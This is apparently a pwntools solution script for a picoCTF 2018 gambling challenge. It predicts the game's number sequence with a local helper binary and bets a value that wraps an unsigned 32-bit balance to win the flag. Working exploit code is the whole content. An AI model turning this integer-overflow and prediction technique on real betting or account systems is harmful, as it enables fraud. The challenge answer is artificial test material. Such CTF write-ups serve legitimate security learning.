#!/usr/bin/env python2.7
from pwn import *
import sys
import re
context.log_level = 500

def getSequence(cash):
    io = process('./get_sequence')
    io.sendline(cash);
    numbers = io.recvline().split()
    io.close()
    return numbers


def exploit():
    if len(sys.argv) == 3:
        host = sys.argv[1] 
        port = sys.argv[2]  
    else:
        host = '2018shell3.picoctf.com'
        port = '48312'
    io = remote(host, port)
    try:
        for i in range (0, 4):
            # Get cash amount first
            cash = io.recvuntil('\n>').split('\n')[-2].split()[2].replace('$', '')
            # Then get numbers to guess
            if i == 0:
                numbers = getSequence(cash)
            # 2 ^ 32 is the maximum amount for unsigned long on 32 bit system, which is -1 (or 0?)
            # Substract the amount that you want negative, in this case I want to reach 1 billion dollars (+1) for the challenge.
            # Sometimes the script fails, if you actually accidentally win the game. 
            # Because chances are least if you pick a number you already used, I choose to use numbers[i-1]
            if i == 3:
                io.sendline(str(2**32-(1000000000 - int(cash) + 1)))
                io.sendafter('\n>', numbers[i-1] + io.newline)
                result = io.recvregex('picoCTF{.*}')
                flag = re.search('picoCTF{.*}', result).group(0)
                print(flag)
            io.sendline(cash)
            io.sendafter('\n>', numbers[i] + io.newline)
        io.close()
    except Exception as e:
        print(e)
        io.close()

exploit()

